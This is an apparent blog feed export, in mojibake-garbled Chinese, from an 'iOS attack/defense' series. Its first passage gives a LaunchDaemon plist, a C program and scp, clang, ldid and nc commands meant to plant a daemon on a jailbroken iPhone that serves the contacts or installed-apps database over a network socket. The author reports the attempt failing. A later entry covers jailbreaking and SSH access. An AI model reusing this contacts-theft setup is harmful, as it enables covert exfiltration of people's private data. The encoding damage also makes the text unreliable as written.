LaunchDaemonsï¼ˆåŽå°é©»ç•™ç¨‹åºå¯åŠ¨ï¼‰æ˜¯ç”¨æˆ·æœªç™»é™†å‰å°±å¯åŠ¨çš„æœåŠ¡(å®ˆæŠ¤è¿›ç¨‹)LaunchAgentsï¼ˆå¯åŠ¨ä»£ç†ï¼‰æ˜¯ç”¨æˆ·ç™»é™†åŽå¯åŠ¨çš„æœåŠ¡(å®ˆæŠ¤è¿›ç¨‹) ç†è§£å‡ ä¸ªåŸºç¡€æ¦‚å¿µï¼š/System/Libraryå’Œ/Libraryå’Œ~/Libraryç›®å½•çš„åŒºåˆ«ï¼Ÿ /System/Libraryç›®å½•æ˜¯å­˜æ”¾Appleè‡ªå·±å¼€å‘çš„è½¯ä»¶ã€‚ /Libraryç›®å½•æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å­˜æ”¾çš„ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚ ~/Library/æ˜¯ç”¨æˆ·è‡ªå·±å­˜æ”¾çš„ç¬¬ä¸‰æ–¹è½¯ä»¶ã€‚ å‡ ä¸ªç›®å½•ä¸‹plistæ–‡ä»¶æ ¼å¼åŠæ¯ä¸ªå­—æ®µçš„å«ä¹‰ï¼š å› ä¸ºiOSå’ŒMacéƒ½æ˜¯åŸºäºŽUnixï¼Œæ‰€ä»¥å¯åŠ¨è¿‡ç¨‹åŸºæœ¬æ˜¯ç±»ä¼¼çš„ã€‚ Key Description Required Label The name of the job yes ProgramArguments Strings to pass to the program when it is executed yes UserName The job will be run as the given user, who may not necessarily be the one who submitted it to launchd. no inetdCompatibility Indicates that the daemon expects to be run as if it were launched by inetd no Program The path to your executable. This key can save the ProgramArguments key for flags and arguments. no onDemand A boolean flag that defines if a job runs continuously or not no RootDirectory The job will be?chrooted?into another directory no ServiceIPC Whether the daemon can speak IPC to launchd no WatchPaths Allows launchd to start a job based on modifications at a file-system path no QueueDirectories Similar to WatchPath, a queue will only watch an empty directory for new files no StartInterval Used to schedule a job that runs on a repeating schedule. Specified as the number of seconds to wait between runs. no StartCalendarInterval Job scheduling. The syntax is similar to cron. no HardResourceLimits Controls restriction of the resources consumed by any job no LowPriorityIO Tells the kernel that this task is of a low priority when doing file system I/O no Sockets An array can be used to specify what socket the daemon will listen on for launch on demand no é…ç½®ä¸€ä¸ªHacké€šè®¯å½•è¿›ç¨‹çš„plistæ–‡ä»¶ æˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªplistæ–‡ä»¶åœ¨ç³»ç»ŸåŠ è½½æ—¶å€™å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹ã€‚ å¦‚ï¼šä¸€ä¸ªåä¸ºhackçš„è¿›ç¨‹ï¼Œè¯¥è¿›ç¨‹åŠ è½½çš„å¯æ‰§è¡Œæ–‡ä»¶hackçš„è·¯å¾„æ˜¯/usr/bin/hackã€‚ é…ç½®çš„plistå¦‚ä¸‹ï¼š plistæºç å¦‚ä¸‹ï¼š Program ï¼š è¿›ç¨‹å¯æ‰§è¡Œæ–‡ä»¶åŠ è½½è·¯å¾„ StandardErrorPath ï¼šæ ‡å‡†é”™è¯¯è·¯å¾„ ProgramArguments ï¼š ç”¨æˆ·ç™»é™†åŽå¯åŠ¨çš„æœåŠ¡è·¯å¾„ inetdCompatibility ï¼šæ˜¯ä¸€ä¸ªå› ç‰¹ç½‘è¶…çº§æœåŠ¡å™¨(å³inetdå®ˆæŠ¤è¿›ç¨‹ï¼‰æ¥ç®€åŒ–å®ˆæŠ¤è¿›ç¨‹çš„ç¼–å†™ã€‚ SockServiceName ï¼š Socketé€šä¿¡ç«¯å£åç§° 1234567891011121314151617181920212223242526272829303132333435&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE plist PUBLIC &quot;-//Apple Computer//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;&lt;!-- hack.plist Created by æ›¹é›ªæ¾ on 2018/7/5. Copyright (c) 2018 æ›¹é›ªæ¾. All rights reserved.--&gt;&lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;Program&lt;/key&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;key&gt;StandardErrorPath&lt;/key&gt; &lt;string&gt;/dev/null&lt;/string&gt; &lt;key&gt;SessionCreate&lt;/key&gt; &lt;true/&gt; &lt;key&gt;ProgramArguments&lt;/key&gt; &lt;array&gt; &lt;string&gt;/usr/bin/hack&lt;/string&gt; &lt;/array&gt; &lt;key&gt;inetdCompatibility&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Wait&lt;/key&gt; &lt;false/&gt; &lt;/dict&gt; &lt;key&gt;Sockets&lt;/key&gt; &lt;dict&gt; &lt;key&gt;Listeners&lt;/key&gt; &lt;dict&gt; &lt;key&gt;SockServiceName&lt;/key&gt; &lt;string&gt;55&lt;/string&gt; &lt;/dict&gt; &lt;/dict&gt; &lt;/dict&gt;&lt;/plist&gt; å°†plistæ–‡ä»¶ä¼ é€åˆ°è‡³iPhone/System/Library/LaunchDaemons/ ä¸‹ 1scp /Users/sevencho/Desktop/hack.plist root@192.168.1.60:/System/Library/LaunchDaemons/hack.plist è¯»å–é€šè®¯å½• &amp; ç”¨æˆ·å®‰è£…Appåˆ—è¡¨ çš„æ‰§è¡Œç¨‹åº æˆ‘ä»¬åªè¦èƒ½æ‹¿å‡ºAddressBook.sqlitedb/itunesstored2.sqlitedbå°±å¯ä»¥æ‹¿åˆ°ç”¨æˆ·çš„æ•°æ®ã€‚ AddressBookçš„æ•°æ®éƒ½åœ¨/var/mobile/Library/AddressBook/AddressBook.sqlitedbä¸­ï¼Œ iTunes Storeçš„æ•°æ®éƒ½åœ¨/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedbä¸­ï¼Œ å†™ä¸€ä¸ªå‡½æ•°ç”¨äºŽè¯»å–ç”¨æˆ·é€šè®¯å½•æ•°æ®åº“æˆ–è€…ç”¨æˆ·å®‰è£…Appåˆ—è¡¨ã€‚ 12345678910111213141516171819202122232425262728//// hack.c//// Created by æ›¹é›ªæ¾ on 2018/7/5.// Copyright Â© 2018 æ›¹é›ªæ¾. All rights reserved.//#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#define FILE "/var/mobile/Library/AddressBook/AddressBook.sqlitedb" // æ‰‹æœºçš„é€šè®¯å½•æ•°æ®åº“è·¯å¾„// #define FILE "/var/mobile/Library/com.apple.itunesstored2.sqlitedb/itunesstored2.sqlitedb" // ç”¨æˆ·å®‰è£…appåˆ—è¡¨æ–‡ä»¶int main()&#123; int fd = open(FILE, O_RDONLY); // è¯»æ•°æ®åº“æ–‡ä»¶ï¼Œè¿”å›žæ–‡ä»¶å¥æŸ„æ ‡è¯† char buf[128]; int ret = 0; if(fd &lt; 0) return -1; while (( ret = read(fd, buf, sizeof(buf))) &gt; 0)&#123; // å°†æ–‡ä»¶è¯»è¿›buffä¸­ write( fileno(stdout), buf, ret); // å†™åˆ°æ ‡å‡†è¾“å‡ºä¸­ &#125; close(fd); return 0;&#125; ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ åœ¨hack.cæ‰€åœ¨ç›®å½•æ‰§è¡Œï¼Œä¹Ÿå¯ä»¥ç›´æŽ¥æŒ‡å®šæ–‡ä»¶è·¯å¾„ 1xcrun -sdk iphoneos clang -arch armv7s -o hack hack.c å¯æ‰§è¡Œæ–‡ä»¶ç­¾åï¼Œå¹¶ä¼ è¾“è‡³iPhoneæ‰‹æœº/usr/binç›®å½• 12ldid -S hackscp hack root@192.168.1.60:/usr/bin/hack æ–°å¼€ä¸€ä¸ªç»ˆç«¯ï¼ŒSSHè¿žæŽ¥æ‰‹æœºã€‚ èŽ·å–AddressBook &amp; ç”¨æˆ·å®‰è£…Appåˆ—è¡¨æ•°æ® åˆ©ç”¨netcatï¼Œå°†æŒ‡å®šæœåŠ¡ç«¯å£çš„æ•°æ®ä»¥æ–‡ä»¶çš„å½¢å¼ä¼ è¾“åˆ°ç”µè„‘çš„å½“å‰ç›®å½•ä¸‹ï¼ŒæŠ“å–è®¾å¤‡ AddressBook æˆ–è€… ç”¨æˆ·å®‰è£…Appåˆ—è¡¨ä¿¡æ¯ã€‚ 55ä¸ºä¹‹å‰plistæ–‡ä»¶é…ç½®çš„SocketæœåŠ¡åç§°ã€‚ 123// æ ¹æ®è‡ªå·±å¯æ‰§è¡Œç¨‹åºè·¯å¾„ï¼Œé€‰æ‹©èŽ·å–çš„æ•°æ®ç±»åž‹nc 192.168.1.60 55 &gt; addressBook.sqlitedb // é€šè®¯å½•nc 192.168.1.60 55 &gt; itunesstored2.sqlitedb // Appåˆ—è¡¨ åˆ©ç”¨netcatèŽ·å–çš„addressBook.sqlitedbæ˜¯ç©ºçš„ã€‚ ä½¿ç”¨å¦‚ä¸‹æŒ‡ä»¤ç›‘æŽ§ä¸‹è¿‡ç¨‹æç¤ºè¿žæŽ¥æ‹’ç»ï¼Œä½†æ˜¯192.168.1.60æ˜¯å¯ä»¥pingé€šçš„ã€‚ ä½¿ç”¨ps auxæŒ‡ä»¤æŸ¥çœ‹æ‰€æœ‰å¯åŠ¨çš„è¿›ç¨‹ï¼Œè²Œä¼¼æ²¡æœ‰æ‰¾åˆ°æˆ‘ä»¬çš„hackè¿›ç¨‹ã€‚ æš‚æ—¶è¿˜æ²¡æœ‰æ‰¾åˆ°è§£å†³æ–¹æ³•ï¼Œå¤§å®¶å¯ä»¥ä¸€èµ·å¸®å¿™æŽ’æŸ¥åŽŸå› ã€‚ 12nc -v 192.168.1.60 55// nc: connectx to 192.168.1.60 port 55 (tcp) failed: Connection refused å¦‚æžœæ–‡ä»¶æœ‰æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨stringå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶å†…å®¹ 1strings itunesstored2.sqlitedb å‚è€ƒ iOSæ”»é˜²â€”â€”ï¼ˆäºŒï¼‰å¦‚ä½•çªƒå–ç”¨æˆ·çš„é€šè®¯å½•ä¿¡æ¯ Mac OSå¯åŠ¨æœåŠ¡ å®ˆæŠ¤è¿›ç¨‹å’Œinetdè¶…çº§æœåŠ¡å™¨ Cè¯­è¨€ä¹‹fileno()å‡½æ•° å¯¹stdinï¼Œstdout å’ŒSTDOUT_FILENOï¼ŒSTDIN_FILENOçš„å­¦ä¹  ncå‘½ä»¤è¯¦è§£]]></content>
      <categories>
        <category>iOS</category>
        <category>æ”»é˜²</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>æ”»é˜²</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOSæ”»é˜²ï¼ˆä¸€ï¼‰ï¼š iPhoneæ‰‹æœºè¶Šç‹± & SSH]]></title>
    <url>%2Farchives%2Fe38331a.html</url>
    <content type="text"><![CDATA[äººåœ¨å¹´è½»æ—¶ï¼Œæœ€å¤´ç–¼çš„ä¸€ä»¶äº‹å°±æ˜¯å†³å®šè‡ªå·±è¿™ä¸€ç”Ÿè¦åšä»€ä¹ˆã€‚â€”â€”çŽ‹å°æ³¢ ã€Šå·¥ä½œä¸Žäººç”Ÿã€‹ å‰è¨€ å¾ˆæ—©ä¹‹å‰å°±æƒ³ç ”ç©¶äº†è§£ä¸€ä¸‹iOSè¶Šç‹±å¼€å‘å’Œé€†å‘ç›¸å…³çš„çŸ¥è¯†ï¼Œç„¶åŽå°±ä¹°äº†ã€ŠiOSåº”ç”¨é€†å‘å·¥ç¨‹ã€‹è¿™æœ¬â€™å°é»„ä¹¦â€™ï¼Œä¹ŸæŸ¥äº†æŸ¥ç›¸å…³çš„èµ„æ–™ï¼Œæ¯”è¾ƒå‡ºåçš„å¯èƒ½å°±æ˜¯iOSå¥³ç¥žå¿µèŒœçš„iOSæ”»é˜²ç³»åˆ—æ–‡ç« äº†ã€‚ ä½†æ˜¯ç”±äºŽè‡ªèº«çš„æƒ°æ€§å’Œå…¶ä»–çš„å¤–ç•Œå› ç´ ï¼Œå¯¼è‡´â€™å°é»„ä¹¦â€™ç¿»äº†å‡ ç« åŽå°±åœ¨å…¬å¸çš„åŠžå…¬æ¡Œä¸Šå¤„äºŽé•¿æ—¶é—´çš„ä¼‘çœ çŠ¶æ€ï¼Œè€Œå¿µèŒœçš„æ–‡ç« å¹´ä»£ç¨å¾®æ¯”è¾ƒä¹…è¿œä¹Ÿåœ¨è¯»äº†ä¸¤ç¯‡åŽè¢«é—å¿˜åœ¨chromeçš„ä¹¦ç­¾é‡Œé¢ï¼ŒçœŸçœŸçš„ä»Žå…¥é—¨åˆ°æ”¾å¼ƒã€‚ðŸ¤£ æœ€è¿‘è¿™æ®µæ—¶é—´åˆšå¥½å·¥ä½œè¡Œæœ‰ä¸€äº›é—²æš‡çš„æ—¶é—´ï¼Œå¶å°”åœ¨ç½‘ä¸Šçœ‹åˆ°ã€ŠiOS åº”ç”¨é€†å‘ä¸Žå®‰å…¨ã€‹è¿™æœ¬ä¹¦ï¼Œè¿™æ˜¯è‡ªâ€œå°é»„ä¹¦â€åŽçš„åˆä¸€æœ¬å…³äºŽé€†å‘å®‰å…¨çš„ä¹¦ã€‚éšæƒ³å†ä»Žå¤´å¼€å§‹å­¦ä¹ ä¸‹iOSè¶Šç‹±å¼€å‘å’Œé€†å‘ç›¸å…³çš„çŸ¥è¯†ï¼Œå¹¶å°†å­¦ä¹ è¿‡ç¨‹åŠé‡‡å‘ç»éªŒè®°å½•äºŽæ­¤ï¼Œå¸Œæœ›è¿™ä¸€æ¬¡ä¼šæœ‰å§‹æœ‰ç»ˆâ€¦ è¿™æ˜¯æœ¬ç³»åˆ—çš„ç¬¬ä¸€ç¯‡ï¼Œå¸Œæœ›ä¸ä¼šæˆä¸ºæœ€åŽä¸€ç¯‡ðŸ’ðŸ˜‚ æ­£æ–‡ çŽ°åœ¨Appleå…¬å¸å·²ç»è¶Šæ¥è¶Šæ³¨é‡å¼€æ”¾æ€§ï¼ŒiPhoneå·²ç»ä¸åƒå‡ å¹´å‰é‚£æ ·å¼‚å¸¸å°é—­ï¼Œè®¸å¤šä»¥å‰åªæœ‰è¶Šç‹±æ‰æœ‰çš„åŠŸèƒ½ä¹Ÿæ…¢æ…¢çš„åŽŸç”Ÿè‡ªå¸¦ï¼Œè¶Šæ¥è¶Šå¤šçš„å°ä¼™ä¼´å·²ç»æ²¡æœ‰äº†å½“å‰é‚£ç§è¶Šç‹±çš„æ¿€æƒ…ï¼Œè€Œéšç€è¶Šæ¥è¶Šå¤šçš„è¶Šç‹±å¤§ç¥žéšé€€ã€è¶Šç‹±ç»„ç»‡è§£æ•£ï¼Œè¾‰ç…Œäº†è¿‘10å¹´çš„è¶Šç‹±ä¹Ÿæ¸æ¸èµ°å‘äº†æ²¡è½ã€‚ ä½†å¦‚æžœæƒ³å€Ÿé‰´åˆ«äººçš„AppæŸä¸ªåŠŸèƒ½å®žçŽ°æ€è·¯æˆ–è€…åŠ å¼ºæˆ‘ä»¬è‡ªå·±Appçš„å®‰å…¨æ€§ï¼Œé‚£ä¹ˆæœ€å¥½çš„é€”å¾„å°±æ˜¯ä»Žè¶Šç‹±å¼€å‘å’Œé€†å‘å…¥æ‰‹ï¼Œè€Œè¿™ä¸€åˆ‡çš„å¼€å§‹çš„åŸºç¡€ï¼šä½ å¿…é¡»è¦æœ‰ä¸€éƒ¨è¶Šç‹±è¿‡çš„iPhoneæ‰‹æœºã€‚ æ‰€æœ‰èµ„æ–™æ–‡ä»¶&amp;å·¥å…·åœ¨è¿™é‡Œ iOS 9x 32ä½ç³»ç»Ÿè¶Šç‹±é…ç½® æœºåž‹ï¼šiPhone4s ç‰ˆæœ¬ï¼šç¾Žç‰ˆ ç³»ç»Ÿï¼š9.3.2 è¶Šç‹±å·¥å…· ä½¿ç”¨Home Depotè¶Šç‹±å·¥å…·ï¼Œä»…æ”¯æŒ32æ‰‹æœºç³»ç»Ÿï¼Œå¦‚æžœæ˜¯64ä½æ‰‹æœºç³»ç»Ÿè¯·ç›´æŽ¥ä½¿ç”¨å„ç§åŠ©æ‰‹è¶Šç‹± æ”¯æŒè®¾å¤‡ï¼ˆ32ä½è®¾å¤‡ï¼‰ï¼š iPhone 4sã€iPhone 5ã€iPhone 5cã€iPad 2ã€iPad 3ã€ iPad 4ã€iPad miniã€iPod touch 5G æ”¯æŒiOSç³»ç»Ÿç‰ˆæœ¬ï¼š iOS 9.1ã€iOS 9.2.1ã€iOS 9.3ã€iOS 9.3.2ã€iOS 9.3.3ã€iOS 9.3.4 è¶Šç‹±é¡»çŸ¥: è¶Šç‹±å‰è¯·å¤‡ä»½æ‚¨çš„é‡è¦èµ„æ–™ä»¥å…é€ æˆä¸¢å¤±ï¼› æœ¬æ¬¡è¶Šç‹±å±žäºŽä¸å®Œç¾Žè¶Šç‹±ï¼Œè‹¥è®¾å¤‡é‡å¯ï¼Œåˆ™ä¼šæ¢å¤åˆ°æœªè¶Šç‹±çŠ¶æ€ï¼ŒCydia åŠå·²è£…å¾—è¶Šç‹±åº”ç”¨ä¼šé—ªé€€ï¼Œè¶Šç‹±æ’ä»¶ä¹Ÿå°†å¤±æ•ˆï¼Œéœ€è¦é‡æ–°æ¿€æ´»ï¼›ä½†æ˜¯å®‰è£…æ’ä»¶Community OffsetsåŽï¼Œé‡å¯è®¾å¤‡è¶Šç‹±ä¹Ÿä¸ä¼šå¤±æ•ˆï¼Œå¯å®žçŽ°å®Œç¾Žè¶Šç‹±ã€‚ è¶Šç‹±å·¥å…·è¯·åœ¨è¿™é‡Œä¸‹è½½ è¶Šç‹±æ­¥éª¤ 1ã€é¦–å…ˆä¸‹è½½ç­¾åå·¥å…·ä»¥åŠè¶Šç‹±ipaï¼Œå°†ç­¾åå·¥å…·è§£åŽ‹åˆ°ç”µè„‘æ¡Œé¢ï¼Œæ‰“å¼€Impactorï¼Œæ‰‹æœºè¿žæŽ¥ç”µè„‘åŽè½¯ä»¶ä¼šè¯»å–åˆ°æ‰‹æœºä¿¡æ¯ï¼› 2ã€ç„¶åŽæŠŠ32ä½iOS9è¶Šç‹±ipaï¼ˆMixtapePlayer.ipaï¼‰æ‹–å…¥è½¯ä»¶é‡Œï¼› 3ã€æç¤ºè¾“å…¥ä½ çš„Apple IDè´¦å·ï¼Œå’ŒApple IDå¯†ç ã€‚ 4ã€Apple IDéªŒè¯å®ŒæˆåŽè½¯ä»¶ä¼šè‡ªåŠ¨å®‰è£…åˆ°æ‰‹æœºé‡Œï¼Œå¯ä»¥åœ¨æ‰‹æœºæ¡Œé¢çœ‹åˆ°Home Depotçš„å›¾æ ‡ï¼Œè¿™ä¸ªå°±æ˜¯è¶Šç‹±å·¥å…·ï¼› 5ã€æŽ¥ä¸‹æ¥è¿›æ‰‹æœºè®¾ç½®-é€šç”¨-è®¾å¤‡ç®¡ç†ï¼Œæ‰¾åˆ°ä½ çš„IDåŽç‚¹è¿›åŽ»å¹¶ç‚¹å‡»ä¿¡ä»»ï¼ˆè®¾å¤‡é¡»ä¿æŒè”ç½‘çŠ¶æ€ï¼‰ï¼› 6ã€ç„¶åŽå›žåˆ°è®¾å¤‡æ¡Œé¢ï¼Œè¿è¡ŒHome Depotåº”ç”¨ï¼Œ ç‚¹å‡»Prepare for jailbreakï¼Œ å†ä¾æ¬¡ç‚¹å‡»Accept â€“&gt; Dismiss â€“&gt; Proceed With Jailbreak â€“&gt; Begin Installation â€“&gt; Use Provided Offsetsï¼› ç­‰å¾…è®¾å¤‡è‡ªåŠ¨é‡å¯åŽï¼ŒCydiaå°±ä¼šå‡ºçŽ°åœ¨æ‰‹æœºæ¡Œé¢åˆ™ä»£è¡¨è¶Šç‹±å®Œæˆï¼Œå¦‚æžœè¶Šç‹±é‡å¯åŽæ²¡æœ‰å‡ºçŽ°Cydiaï¼Œåˆ™å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼› æˆåŠŸåŽæ‰“å¼€Cydiaï¼Œæ·»åŠ æ’ä»¶æºã€Œhttp://repo.tihmstar.netã€ï¼Œåœ¨Cydiaä¸­æœç´¢ã€ŒCommunity Offsetsã€å¹¶æ’ä»¶å®‰è£…ï¼Œå®‰è£…åŽå³ä½¿é‡å¯è¶Šç‹±ä¹Ÿä¸ä¼šå¤±æ•ˆï¼ŒCydiaä¹Ÿä¸ä¼šé—ªé€€ï¼Œç›¸å½“äºŽå®Œç¾Žè¶Šç‹±ã€‚ iOS 10x 32ä½ç³»ç»Ÿè¶Šç‹±é…ç½® æœºåž‹ï¼šiPhone5c ç‰ˆæœ¬ï¼šç¾Žç‰ˆ ç³»ç»Ÿï¼š10.3.2 è¶Šç‹±å·¥å…· ä½¿ç”¨h3lix-RC5è¶Šç‹±å·¥å…·ï¼Œä»…æ”¯æŒ32æ‰‹æœºç³»ç»Ÿï¼Œå¦‚æžœæ˜¯64ä½æ‰‹æœºç³»ç»Ÿè¯·ç›´æŽ¥ä½¿ç”¨å„ç§åŠ©æ‰‹è¶Šç‹±ã€‚ æ”¯æŒè®¾å¤‡ï¼ˆ32ä½è®¾å¤‡ï¼‰ï¼š iPhone 4sã€iPhone 5ã€iPhone 5cã€iPad 2ã€iPad 3ã€ iPad 4ã€iPad miniã€iPod touch 5G æ”¯æŒiOSç³»ç»Ÿç‰ˆæœ¬ï¼š iOS 10 - 10.3.x è¶Šç‹±é¡»çŸ¥: è¶Šç‹±å‰è¯·å¤‡ä»½æ‚¨çš„é‡è¦èµ„æ–™ä»¥å…é€ æˆä¸¢å¤±ï¼› æœ¬æ¬¡è¶Šç‹±å±žäºŽä¸å®Œç¾Žè¶Šç‹±ï¼Œè‹¥è®¾å¤‡é‡å¯ï¼Œåˆ™ä¼šæ¢å¤åˆ°æœªè¶Šç‹±çŠ¶æ€ï¼ŒCydia åŠå·²è£…å¾—è¶Šç‹±åº”ç”¨ä¼šé—ªé€€ï¼Œè¶Šç‹±æ’ä»¶ä¹Ÿå°†å¤±æ•ˆï¼Œéœ€è¦é‡æ–°æ¿€æ´»ï¼› è¶Šç‹±å·¥å…· h3lix Cydia Impactor è¶Šç‹±æ­¥éª¤ 1ã€é¦–å…ˆä¸‹è½½ç­¾åå·¥å…·ä»¥åŠè¶Šç‹±ipaï¼Œå°†ç­¾åå·¥å…·è§£åŽ‹åˆ°ç”µè„‘æ¡Œé¢ï¼Œæ‰“å¼€Impactorï¼Œæ‰‹æœºè¿žæŽ¥ç”µè„‘åŽè½¯ä»¶ä¼šè¯»å–åˆ°æ‰‹æœºä¿¡æ¯ï¼› 2ã€ç„¶åŽæŠŠ32ä½iOS10xè¶Šç‹±ipaï¼ˆh3lix-RC5.ipaï¼‰æ‹–å…¥è½¯ä»¶é‡Œï¼› 3ã€æç¤ºè¾“å…¥ä½ çš„Apple IDè´¦å·ï¼Œå’ŒApple IDå¯†ç ã€‚ 4ã€Apple IDéªŒè¯å®ŒæˆåŽè½¯ä»¶ä¼šè‡ªåŠ¨å®‰è£…åˆ°æ‰‹æœºé‡Œï¼Œå¯ä»¥åœ¨æ‰‹æœºæ¡Œé¢çœ‹åˆ°h3lixçš„å›¾æ ‡ï¼Œè¿™ä¸ªå°±æ˜¯è¶Šç‹±å·¥å…·ï¼› 5ã€æŽ¥ä¸‹æ¥è¿›æ‰‹æœºè®¾ç½®-é€šç”¨-è®¾å¤‡ç®¡ç†ï¼Œæ‰¾åˆ°ä½ çš„IDåŽç‚¹è¿›åŽ»å¹¶ç‚¹å‡»ä¿¡ä»»ï¼ˆè®¾å¤‡é¡»ä¿æŒè”ç½‘çŠ¶æ€ï¼‰ï¼› 6ã€ç„¶åŽå›žåˆ°è®¾å¤‡æ¡Œé¢ï¼Œè¿è¡Œh3lixåº”ç”¨ï¼Œ ç‚¹å‡»å±å¹•ä¸­é—´çš„jailbreakï¼Œ ç­‰å¾…è®¾å¤‡è‡ªåŠ¨é‡å¯åŽï¼Œ å¦‚æžœæç¤ºå¦‚ä¸‹é”™è¯¯ï¼Œå¯ä¸ç”¨ç®¡ Cydiaå°±ä¼šå‡ºçŽ°åœ¨æ‰‹æœºæ¡Œé¢åˆ™ä»£è¡¨è¶Šç‹±å®Œæˆï¼Œå¦‚æžœè¶Šç‹±é‡å¯åŽæ²¡æœ‰å‡ºçŽ°Cydiaï¼Œåˆ™å¯ä»¥å¤šè¯•å‡ æ¬¡ï¼Œç›´åˆ°æˆåŠŸä¸ºæ­¢ï¼› æ’ä»¶å®‰è£… iphoneè¶Šç‹±åŽå°±éœ€è¦å®‰è£…ä¸€äº›æ’ä»¶æ¥ååŠ©è¿›è¡Œä¸€äº›é€†å‘è¾…åŠ©æ“ä½œã€‚ å¦‚æžœéƒ¨åˆ†éœ€è¦çš„æ’ä»¶æ‰¾ä¸åˆ°ï¼Œå¯ä»¥å…ˆå°è¯•æ·»åŠ ä¸€äº›Cydiaæºã€‚å¦‚ä¸‹æ˜¯æˆ‘æ·»åŠ çš„æºåœ°å€ï¼š tihmstar: http://repo.tihmstar.netå¤šçŽ©æº: http://yuan.duowan.comBigBoss: http://apt.thebigboss.org/repofiles/cydia/é›·é”‹æº http://apt.abcydia.com è¶Šç‹±å¿…å¤‡å·¥å…·(20180702)ï¼š openSSH // è¿œç¨‹æŽ§åˆ¶ï¼Œå¦‚è¿œç¨‹ç™»å½• (å¦‚æžœè¶Šç‹±å·¥å…·è‡ªå¸¦Dropbearä¸éœ€è¦å®‰è£…) MobileTerminal // æ— æ³•å®‰è£… å¯ç”¨MTerminalä»£æ›¿ MTerminal LLVM+Clang // 32ä½æ‰‹æœºéœ€è¦ä¸‹è½½32ä½çš„æ‰å¯ä»¥å®‰è£…ï¼Œå¦åˆ™æ— æ³•å®‰è£…(è¯•äº†ä¸¤å°æ‰‹æœºéƒ½æ²¡æœ‰å®‰è£…æˆåŠŸï¼Œä¸çŸ¥é“æ˜¯ä¸æ˜¯ä»¥ä¸º32ä½ç³»ç»Ÿæˆ–è€…16Gçš„ç¼˜æ•…) LD64 Darwin CC Tools adv-cmds: æ‰§è¡Œ ps å‘½ä»¤æŠ¥é”™ï¼Œéœ€è¦å®‰è£…è¿™ä¸ªå·¥å…·ï¼› iFile: (æ²¡æœ‰å®‰è£…æˆåŠŸ) å¯ä»¥å®‰è£…Filza Filzaï¼šåœ¨æ‰‹æœºä¸ŠæŸ¥çœ‹æ–‡ä»¶ç›®å½•ï¼›(å¿…è£…) Apple File Conduitâ€2â€ï¼Œå®‰è£…å®ŒåŽiFunboxç­‰åŠ©æ‰‹è½¯ä»¶å¯ä»¥è¯»å–æ‰‹æœºRootæ–‡ä»¶ scpï¼šç»ˆç«¯å‘½ä»¤ï¼ŒæŠŠè¿œç¨‹è®¾å¤‡çš„æ–‡ä»¶å¤åˆ¶åˆ°å¦ä¸€ä¸ªè®¾å¤‡ï¼› è¿˜éœ€è¦çš„è½¯ä»¶ï¼š Cydia Translations // å®‰è£…åŽè‡ªå¸¦ Cydia Substrate // å…è®¸ç¬¬ä¸‰æ–¹å¼€å‘è€…åœ¨è¶Šç‹±ç³»ç»Ÿçš„æ–¹æ³•ä¸­æ‰“ä¸€äº›è¡¥ä¸æˆ–æ‰©å±•æ–¹æ³•ã€‚ Cydia Installer // å®‰è£…åŽè‡ªå¸¦ SSHSSHé€šè¿‡WiFiè¿žæŽ¥æ‰‹æœº OpenSSHåŽŸæ˜¯ä¸€ä¸ªåœ¨Linuxä¸‹å¾ˆå®žç”¨çš„ä¸€ä¸ªè½¯ä»¶ã€‚iPhoneæœ¬èº«å°±æ˜¯ä¸€ä¸ªè¿è¡ŒBSDç³»ç»Ÿ(å¯è®¤ä¸ºæ˜¯ä¸€ç§Liunx)çš„ç¡¬ä»¶ï¼Œå› æ­¤ï¼ŒCydiaçš„ä½œè€…SaurikæŠŠOpenSSHè¿™ä¸€è½¯ä»¶ç§»æ¤åˆ°äº†iOSå¹³å°ä¸Šï¼Œå¹¶ä¸”ç®€åŒ–äº†å®‰å…¨è®¤è¯å¯†é’¥çš„ç¹çï¼Œä½¿ä¹‹æˆä¸ºä¸€æ¬¾å¯ä»¥åœ¨iPhoneä¸Šè¿è¡Œçš„Cydiaæ’ä»¶ã€‚ å…³äºŽssh(Secure Shell)è¯¦ç»†èµ„æ–™è¯·è‡ªè¡Œæœç´¢ç›¸å…³èµ„æ–™ï¼Œå¯ä»¥ç®€å•ç†è§£æˆã€Žè¿œç¨‹ç™»å½•ã€ï¼Œå¯ä»¥é€šè¿‡ä¸€å°è®¾å¤‡è¿œç¨‹ç™»é™†å¦ä¸€å°è®¾å¤‡ã€‚ ä¿è¯ä½ çš„Macå’ŒiPhoneåœ¨åŒä¸€ç½‘æ®µ ç¡®å®šiPhoneçš„IP è¿œç¨‹ç™»é™† Terminalè¾“å…¥ 1ssh root@xxx.xxx.xxx.xxx // xxx.xxx.xxx.xxxä¸ºæ‰‹æœºipåœ°å€ å¦‚æžœç³»ç»Ÿæ˜¯iOS10.3ä»¥ä¸Šï¼Œé»˜è®¤æ˜¯ä¸èƒ½ç›´æŽ¥ä½¿ç”¨sshé€šè¿‡wifiæˆ–è€…USBè®¿é—®æ‰‹æœºçš„ï¼Œè¯¦æƒ…è¯·å‚è€ƒiPhone10.3.Xè¶Šç‹±åŽSSHè¿žæŽ¥ä¸ä¸Šçš„é—®é¢˜ï¼ˆå·²è§£å†³ï¼‰ 1.å¸è½½æ‰‹æœºä¸Šçš„OpenSSLå’ŒOpenssh 2.æ·»åŠ æºï¼šhttp://cydia.ichitaso.com/test 3.æœç´¢å¹¶ä¸‹è½½ï¼šdropbear 